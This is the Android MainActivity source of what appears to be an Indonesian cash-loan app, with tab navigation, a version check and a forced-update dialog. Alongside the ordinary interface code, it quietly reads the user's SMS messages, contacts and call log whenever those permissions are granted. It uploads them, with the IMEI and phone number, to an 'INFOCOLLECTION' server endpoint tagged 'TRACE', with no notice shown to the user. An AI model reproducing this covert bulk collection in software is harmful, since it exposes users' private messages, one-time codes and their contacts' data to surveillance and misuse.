package com.ptyl.uang.flash;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.design.widget.TabLayout;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.view.ViewPager;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.facebook.accountkit.AccountKit;
import com.google.gson.Gson;
import com.ptyl.uang.flash.activity.BasicActivity;
import com.ptyl.uang.flash.bean.IntegralBean;
import com.ptyl.uang.flash.bean.VersionBean;
import com.ptyl.uang.flash.fragment.CertificationFragment;
import com.ptyl.uang.flash.fragment.LoanFragment;
import com.ptyl.uang.flash.fragment.MineFragment;
import com.ptyl.uang.flash.utils.Contants;
import com.ptyl.uang.flash.utils.PhoneInfo;
import com.ptyl.uang.flash.utils.SharedPreUtil;
import com.ptyl.uang.flash.utils.StatusBarUtils;
import com.ptyl.uang.flash.view.LoadingCustom;
import com.ptyl.uang.flash.view.NoScrollViewPager;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends BasicActivity {
    private TabLayout mTabLayout;
    //Tab 文字
    private final int[] TAB_TITLES = new int[]{R.string.load, R.string.certification, R.string
            .mine};
    //Tab 图片
    private final int[] TAB_IMGS = new int[]{R.drawable.tab_loan_selector, R.drawable
            .tab_ather_selector, R.drawable.tab_me_selector};
    //Fragment 数组
    private List<Fragment> TAB_FRAGMENTS;
    //Tab 数目
    private final int COUNT = TAB_TITLES.length;
    private MyViewPagerAdapter mAdapter;
    private NoScrollViewPager mViewPager;
    public static MainActivity mainActivity;
    public static boolean isFirst = true;
    String smsInfo;
    String contactUser;
    String phoneDto;
    String mobile;
    String timestamp;
    VersionBean versionBean;
    Handler handler = new Handler();
    @SuppressLint("HandlerLeak")
    Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            String result = msg.getData().getString("result");
            switch (msg.what) {
                case 0:
                    if (!TextUtils.isEmpty(result)) {
                        try {
                            Gson gson = new Gson();
                            IntegralBean integralBean = gson.fromJson(result, IntegralBean.class);
                            if (!TextUtils.isEmpty(integralBean.getError())) {
                                if ("err.auth.access.denied".equals(integralBean.getError())) {
                                    SharedPreUtil.saveSring(mContext, SharedPreUtil.PHONE, "");
                                    SharedPreUtil.saveSring(mContext, SharedPreUtil.TOKEN, "");
                                    SharedPreUtil.saveBoolean(mContext, SharedPreUtil.ISLOGIN, false);

                                    Intent intent = new Intent(Contants.action);
                                    intent.putExtra("isShow", false);
                                    mContext.sendBroadcast(intent);
                                }else {
                                    Toast.makeText(mContext, integralBean.getError(), Toast
                                            .LENGTH_SHORT).show();
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    break;
            }
        }
    };
    int force = 0;
    /**
     * 退出定时
     */
    private Timer tExit = null;
    /**
     * 是否可以退出
     */
    private static Boolean isExit = false;
    private String imei;

    @Override
    protected int getResourceId() {
        return R.layout.activity_main;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mainActivity = MainActivity.this;
    }

    @Override
    protected void init() {
        StatusBarUtils.setWindowStatusBarColor(this, R.color.tab_bg, StatusBarUtils.Position
                .STATUS);
    }

    @Override
    protected void initView() {
        mTabLayout = (TabLayout) findViewById(R.id.bottom_tab_layout);
        setTabs(mTabLayout, this.getLayoutInflater(), TAB_TITLES, TAB_IMGS);
        mViewPager = (NoScrollViewPager) findViewById(R.id.viewpager);
        mTabLayout.setTabTextColors(getResources().getColor(R.color.light_grey), getResources()
                .getColor(R.color.green));
    }


    @Override
    protected void initData() {
        TAB_FRAGMENTS = new ArrayList<>();
        TAB_FRAGMENTS.add(LoanFragment.newInstance());
        TAB_FRAGMENTS.add(CertificationFragment.newInstance());
        TAB_FRAGMENTS.add(MineFragment.newInstance());
        mAdapter = new MyViewPagerAdapter(getSupportFragmentManager());
        mViewPager.setAdapter(mAdapter);
        mViewPager.setNoScroll(true);
        mViewPager.addOnPageChangeListener(new TabLayout.TabLayoutOnPageChangeListener(mTabLayout));
        mTabLayout.setOnTabSelectedListener(new TabLayout.ViewPagerOnTabSelectedListener
                (mViewPager));
        mTabLayout.getTabAt(0).select();
        mTabLayout.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {
                if (tab.getPosition() == 2) {
                    StatusBarUtils.setWindowStatusBarColor(MainActivity.this, R.color.green,
                            StatusBarUtils.Position.STATUS);
                } else {
                    StatusBarUtils.setWindowStatusBarColor(MainActivity.this, R.color.tab_bg,
                            StatusBarUtils.Position.STATUS);
                }
                if (tab.getPosition() != 1) {
                    Intent intent = new Intent(Contants.action);
                    intent.putExtra("isShow", false);
                    mContext.sendBroadcast(intent);
                }
                if (tab.getPosition() != 0) {
                    Intent intent = new Intent(Contants.action_loan);
                    intent.putExtra("loanInfo", false);
                    mContext.sendBroadcast(intent);
                }
            }

            @Override
            public void onTabUnselected(TabLayout.Tab tab) {
            }

            @Override
            public void onTabReselected(TabLayout.Tab tab) {

            }
        });
        mViewPager.setOnPageChangeListener(new ViewPager.OnPageChangeListener() {
            @Override
            public void onPageScrolled(int position, float positionOffset, int
                    positionOffsetPixels) {

            }

            @Override
            public void onPageSelected(int position) {

            }

            @Override
            public void onPageScrollStateChanged(int state) {

            }
        });
        getVersion();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(Contants.action_running);
        registerReceiver(broadcastReceiver, intentFilter);
    }

    @Override
    protected void initListener() {

    }

    /**
     * @description: 设置添加Tab
     */
    private void setTabs(TabLayout tabLayout, LayoutInflater inflater, int[] tabTitlees, int[]
            tabImgs) {
        for (int i = 0; i < tabImgs.length; i++) {
            TabLayout.Tab tab = tabLayout.newTab();
            View view = inflater.inflate(R.layout.tab_custom, null);
            tab.setCustomView(view);

            TextView tvTitle = (TextView) view.findViewById(R.id.tv_tab);
            tvTitle.setText(tabTitlees[i]);
            ImageView imgTab = (ImageView) view.findViewById(R.id.img_tab);
            imgTab.setImageResource(tabImgs[i]);
            tabLayout.addTab(tab);
        }
    }

    public void getVersion() {
        OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
        Request request = new Request.Builder().url(Contants.VERSION).get().build();
        Call call1 = okHttpClient.newCall(request);
        call1.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("Log", e.getMessage() + "失败");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String respones = response.body().string();
                Gson gson = new Gson();
                versionBean = gson.fromJson(respones, VersionBean.class);
                handler.post(runnable);
                Log.e("Version", respones + "put");
            }
        });
    }

    Runnable runnable = new Runnable() {
        @Override
        public void run() {
            if (versionBean != null) {
                try {
                    int code = Integer.parseInt(versionBean.getVersionNo());
                    int versionCode = mContext.getPackageManager().getPackageInfo(mContext
                            .getPackageName(), 0).versionCode;
                    Log.e("log", versionCode + "");
                    force = Integer.parseInt(versionBean.getIs_force());
                    if (code > versionCode) {
                        updateDialog(force);
                    }
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }
            }
        }
    };

    private void openUpdate() {
        Uri uri = Uri.parse(Contants.UPDATEURL);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        startActivity(intent);
    }

    private void updateDialog(int isForce) {
        LayoutInflater layoutInflater = LayoutInflater.from(this);
        View view_dialog = layoutInflater.inflate(R.layout.layout_dialog, null);
        final AlertDialog dialog = new AlertDialog.Builder(this).create();
        dialog.show();
        dialog.getWindow().setContentView(view_dialog);
        dialog.setCanceledOnTouchOutside(false);
        dialog.setCancelable(false);
        dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        TextView dialogTitle = (TextView) view_dialog.findViewById(R.id.dialog_title);
        TextView dialogDetails = (TextView) view_dialog.findViewById(R.id.dialog_details);
        TextView dialogCancel = (TextView) view_dialog.findViewById(R.id.dialog_cancel);
        TextView dialogSure = (TextView) view_dialog.findViewById(R.id.dialog_sure);
        dialogTitle.setText(R.string.update_title);
        dialogDetails.setText(R.string.have_update);
        dialogCancel.setText(R.string.cancel);
        dialogSure.setText(R.string.update);
        if (isForce == 0) {
            dialogCancel.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    dialog.dismiss();
                }
            });
        }
        dialogSure.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
                openUpdate();
            }
        });
    }

    /**
     * @description: ViewPager 适配器
     */
    private class MyViewPagerAdapter extends FragmentPagerAdapter {
        public MyViewPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int position) {
            return TAB_FRAGMENTS.get(position);
        }

        @Override
        public int getCount() {
            return COUNT;
        }
    }

    public void setSelected(int curItem) {
        mViewPager.setCurrentItem(curItem);
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (event.getKeyCode() == KeyEvent.KEYCODE_BACK) {
            exitByDoubleClick();
        }
        return false;
    }

    private void exitByDoubleClick() {
        if (!isExit) {
            isExit = true;
            Toast.makeText(MainActivity.this, R.string.click_agin_out, Toast.LENGTH_SHORT).show();
            tExit = new Timer();
            tExit.schedule(new TimerTask() {
                @Override
                public void run() {
                    isExit = false;//取消退出
                }
            }, 2000);// 如果2秒钟内没有按下返回键，则启动定时器取消掉刚才执行的任务
        } else {
            finish();
            AccountKit.logOut();
            System.exit(0);
        }
    }

    public void onRequestPermissionsResult(int requestCode, final String[] permissions, int[]
            grantResults) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            switch (requestCode) {
                case 0:
                    smsInfo = PhoneInfo.getSmsFromPhone(MainActivity.this);
                    upPhoneInfo(imei, mobile, timestamp, smsInfo);
                    break;
                case 1:
                    phoneDto = PhoneInfo.getPhone(MainActivity.this);
                    upPhoneInfo(imei, mobile, timestamp, phoneDto);
                    break;
                case 2:
                    contactUser = PhoneInfo.getDataList(MainActivity.this);
                    upPhoneInfo(imei, mobile, timestamp, contactUser);
                    break;
            }
        } else {
            Toast.makeText(this, R.string.permission_fail, Toast.LENGTH_SHORT).show();
        }
    }

    private  void upPhoneInfo(String imei, String mobile, String timestamp, String
            messageBody) {
        OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
        FormBody.Builder builder = new FormBody.Builder();
        builder.add("imei", imei);
        builder.add("mobile", mobile);
        builder.add("timestamp", timestamp);
        builder.add("messageType", "TRACE");
        builder.add("messageBody", messageBody);
        RequestBody formBody = builder.build();
        Request request = new Request.Builder().url(Contants.INFOCOLLECTION).put(formBody).build();
        Call call1 = okHttpClient.newCall(request);
        call1.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("Log", e.getMessage() + "失败");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String respones = response.body().string();
                Log.e("Log", respones + "put");
            }
        });
    }

    public void getIntegral(String token) {
        OkHttpClient okHttpClient = new OkHttpClient();
//        get 请求
        Request request = new Request.Builder().addHeader(Contants.HEADER_KEY, token).url
                (Contants.INTERGRAL).build();
        Call call = okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                mHandler.sendEmptyMessage(4);
                Log.e("MineFragment", e.getMessage() + "失败");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String respones = response.body().string();
                Message message = new Message();
                Bundle bundle = new Bundle();
                bundle.putString("result", respones);
                message.setData(bundle);
                message.what = 0;
                mHandler.sendMessage(message);
                Log.e("MineFragment", respones);
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        String token = SharedPreUtil.readString(mContext, SharedPreUtil.TOKEN, "");
        if (!TextUtils.isEmpty(token)) {
            getIntegral(token);
        }
        if (isFirst) {
            imei = PhoneInfo.getIMEI(MainActivity.this);
            mobile = SharedPreUtil.readString(MainActivity.this, SharedPreUtil.PHONE, "");
            timestamp = System.currentTimeMillis() + "";
            if (TextUtils.isEmpty(mobile)) {
                return;
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) ==
                    PackageManager.PERMISSION_GRANTED) {
                smsInfo = PhoneInfo.getSmsFromPhone(MainActivity.this);
                upPhoneInfo(imei, mobile, timestamp, smsInfo);
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) ==
                    PackageManager.PERMISSION_GRANTED) {
                phoneDto = PhoneInfo.getPhone(MainActivity.this);
                upPhoneInfo(imei, mobile, timestamp, phoneDto);
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) ==
                    PackageManager.PERMISSION_GRANTED) {
                contactUser = PhoneInfo.getDataList(MainActivity.this);
                upPhoneInfo(imei, mobile, timestamp, contactUser);
            }
            isFirst = false;
        }
    }
    BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
          boolean  running = intent.getBooleanExtra("running",false);
          Log.e("Main",running+"");
          if (running){
              LoadingCustom.showprogress(MainActivity.this,"",false);
          }else {
              LoadingCustom.dismissprogress();
          }
        }
    };
}
